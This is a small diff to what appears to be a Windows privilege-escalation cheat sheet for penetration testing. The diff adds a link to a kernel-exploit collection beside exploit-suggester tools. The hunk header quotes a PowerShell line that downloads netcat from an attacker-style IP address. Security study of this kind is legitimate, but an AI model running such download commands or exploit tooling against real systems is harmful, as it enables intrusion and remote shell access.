@@ -622,6 +622,7 @@ IEX(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.23:8000/nc.ex
 
 ### Other
 * [exploit suggester (metasploit)](https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/)
+* [windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)
  
 ### [windows-exploit-suggester.py (local)](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
 this script uses python2 which can lead to issues. create virtualenv and make sure you are using xlrd version 1.2.0
